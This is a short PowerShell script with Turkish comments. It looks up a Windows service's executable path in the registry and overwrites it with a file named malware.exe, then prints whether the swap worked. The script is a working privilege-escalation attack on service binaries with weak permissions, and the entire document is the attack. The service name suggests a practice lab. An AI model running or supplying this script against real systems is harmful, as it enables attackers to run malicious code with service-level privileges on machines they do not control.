# Servis adı ve zararlı dosya yolu
$serviceName = "TestZayifServis"
$maliciousExePath = "C:\Users\Enes\malware.exe"

# Servisin exe dosyasını değiştirme izni varsa
# Servis dosya yolunu al
$svcPath = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName").ImagePath

Write-Host "Servis exe yolu: $svcPath"

try {
    # Dosyayı değiştirmeye çalış
    Copy-Item $maliciousExePath $svcPath -Force
    Write-Host "[+] Servis exe dosyası başarıyla değiştirildi."
}
catch {
    Write-Error "[-] Dosya değiştirme başarısız: $_"
}
